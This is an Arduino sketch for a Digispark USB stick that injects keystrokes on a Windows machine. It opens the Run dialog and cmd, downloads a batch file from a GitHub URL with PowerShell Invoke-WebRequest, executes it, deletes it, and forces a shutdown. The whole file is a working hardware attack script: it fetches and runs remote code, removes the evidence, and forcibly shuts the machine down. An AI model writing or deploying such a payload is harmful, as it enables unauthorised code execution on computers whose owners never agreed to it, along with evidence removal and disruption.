#include <C:\Users\YOURUSERNAME\Desktop\Digispark\GermanKeyboard.h>

void setup()
{
	pinMode(1, OUTPUT);
	DigiKeyboard.delay(1);
	digitalWrite(1, HIGH);
	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
	DigiKeyboard.delay(400);
	pn("cmd", 400);
	pn("cd %homepath%");
	pn("powershell -Command \"Invoke-WebRequest https://raw.githubusercontent.com/timmyrs/Digispark-German-Keyboard-API/master/examples/Background.bat -UseBasicParsing -OutFile Background.bat\"");
	pn("Background.bat");
	pn("cd %homepath%");
	pn("del Background.bat");
	pn("shutdown -f");
	digitalWrite(1, LOW);
}

void loop(){}
